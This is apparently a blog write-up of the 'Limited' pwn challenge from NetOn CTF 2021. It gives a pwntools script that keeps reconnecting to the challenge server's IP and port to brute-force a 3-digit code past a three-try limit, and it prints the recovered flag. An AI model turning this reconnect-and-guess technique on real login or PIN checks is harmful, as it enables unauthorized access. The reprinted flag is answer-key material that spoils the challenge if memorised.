---
title: NetOn CTF 2021 - Limited
category: CTF
tags: Write-up Pwn Brute-force
excerpt_separator: <!--more-->
---

Pwn -- 499 pts (4 solves) -- Chall author: X4v1l0k

Flag is locked behind a 3-digit code, which can be trivially brute-forced.

<!--more-->

## Challenge

![](/assets/ctf/Pwn%20-%20Limited.png)

Upon connecting it promptly tells us we have 3 tries to guess a 3-digit code. Well... if you do not want to let me in if I ask nicely, I will just guess my way in >:).

## Solution

I use pwntools in Python to spam the address with password guesses:
```py
#!/usr/bin/env python3

# Imports
from pwn import *

# Connect parameters
host = "167.99.129.209"
port = 10002

pwd = 0
while pwd < 1000:
	# Open connection
	s = remote(host, port)
	s.recvuntil("\n")
	# Loop over given tries (re-connect afterwards)
	for j in range(3):
		# Increment trial 3-digit password and send
		pwd += 1
		s.sendline(str(pwd))
		# Get return
		rstr = s.recvuntil("\n", drop=True).decode("latin-1")
		print(rstr)
		s.recvuntil("\n")
		# Check return string
		if rstr[0] != 'S':
			print(rstr)
			pwd += 1000
		# Visual check of progress
		if pwd % 100 == 0:
			print(pwd)
	# Close connection
	s.close()
```

Although the password is randomised (as could be deduced from the provided ELF), a 3-digit password can be easily brute-forced. So to no surprise, after some guessing this script got lucky and got returned:

```
Nice! The flag is NETON{N1c3_ByP4sS_My_Fr13eND!}
```

I'm not sure whether or not this counts as a bypass... but hey, it worked. : )